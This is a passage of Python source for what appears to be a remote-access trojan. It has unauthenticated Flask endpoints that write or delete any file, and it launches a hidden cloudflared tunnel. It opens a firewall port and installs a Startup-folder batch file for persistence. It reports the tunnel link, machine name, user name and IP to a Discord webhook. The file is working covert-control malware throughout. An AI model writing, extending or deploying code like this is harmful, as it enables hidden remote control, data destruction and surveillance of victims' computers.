def api_disk_write():
    try:
        data = request.json
        path = data.get('path', '')
        content = data.get('content', '')
        
        if not path:
            return jsonify({'status': 'error', 'msg': 'Invalid path'}), 400
        
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return jsonify({'status': 'ok', 'msg': 'File saved'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

@app.route('/api/disk/delete', methods=['POST'])
def api_disk_delete():
    try:
        data = request.json
        path = data.get('path', '')
        
        if not path or not os.path.exists(path):
            return jsonify({'status': 'error', 'msg': 'Invalid path'}), 400
        
        if os.path.isfile(path):
            os.remove(path)
        else:
            shutil.rmtree(path)
        
        return jsonify({'status': 'ok', 'msg': 'Deleted'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

def send_discord_webhook(link, timestamp, machine, user, ip):
    content = f"""**Remote Control Started - ULTRA PRO**
Link: {link}
Time: {timestamp}
Machine: {machine}
User: {user}
IP: {ip}

Features: Screen | CMD | Disk Manager"""
    
    try:
        requests.post(WEBHOOK_URL, json={'content': content}, timeout=10)
    except:
        pass

def get_external_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()['ip']
    except:
        return "Unknown"

def download_cloudflared():
    if CLOUDFLARED_PATH.exists():
        return True
    
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()
        
        with open(CLOUDFLARED_PATH, 'wb') as f:
            f.write(response.content)
        
        os.chmod(CLOUDFLARED_PATH, 0o755)
        return True
    except:
        return False

def start_tunnel():
    global tunnel_process, tunnel_link
    
    cmd = [str(CLOUDFLARED_PATH), "tunnel", "--url", f"http://localhost:{PORT}"]
    
    creation_flags = 0
    if sys.platform == 'win32':
        creation_flags = subprocess.CREATE_NO_WINDOW
    
    tunnel_process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        creationflags=creation_flags
    )
    
    link_pattern = re.compile(r'https://[a-z0-9-]+\.trycloudflare\.com')
    start_time = time.time()
    
    while time.time() - start_time < 30:
        line = tunnel_process.stdout.readline()
        if not line:
            break
        
        match = link_pattern.search(line.strip())
        if match:
            tunnel_link = match.group(0)
            return tunnel_link
        
        time.sleep(0.1)
    
    if tunnel_process:
        tunnel_process.terminate()
    return None

def add_startup():
    """Add to Windows startup - FIXED for PyInstaller"""
    bat_path = STARTUP_FOLDER / SHORTCUT_NAME
    
    if bat_path.exists():
        return
    
    try:
        # Sử dụng SCRIPT_PATH đã được fix cho PyInstaller
        exe_path = SCRIPT_PATH
        working_dir = BASE_DIR
        
        bat_content = f"""@echo off
cd /d "{working_dir}"
start /min "" "{exe_path}"
exit"""
        
        with open(bat_path, 'w') as f:
            f.write(bat_content)
    except:
        pass

def open_firewall_port():
    try:
        creation_flags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
        subprocess.check_call(
            'netsh advfirewall firewall show rule name="FlaskRemote" >nul',
            shell=True,
            creationflags=creation_flags
        )
    except:
        try:
            creation_flags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            subprocess.check_call(
                f'netsh advfirewall firewall add rule name="FlaskRemote" dir=in action=allow protocol=TCP localport={PORT}',
                shell=True,
                creationflags=creation_flags
            )
        except:
            pass

def main():
    global server_running
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    machine = os.environ.get('COMPUTERNAME', 'Unknown')
    user = os.environ.get('USERNAME', 'Unknown')
    ip = get_external_ip()
    
    open_firewall_port()
    
    if not download_cloudflared():
        sys.exit(1)
    
    def run_server():
        socketio.run(
            app,
            host='0.0.0.0',
            port=PORT,
            debug=False,
            use_reloader=False,
            allow_unsafe_werkzeug=True,
            log_output=False
        )
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_running = True
    server_thread.start()
    
    time.sleep(5)
    
    link = start_tunnel()
    if not link:
        server_running = False
        sys.exit(1)
    
    add_startup()
    send_discord_webhook(link, timestamp, machine, user, ip)
    
    try:
        while True:
            time.sleep(10)
            
            if tunnel_process and tunnel_process.poll() is not None:
                link = start_tunnel()
                if link:
                    send_discord_webhook(link, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), machine, user, ip)
    except KeyboardInterrupt:
        server_running = False
        if tunnel_process:
            tunnel_process.terminate()

if __name__ == "__main__":
    main()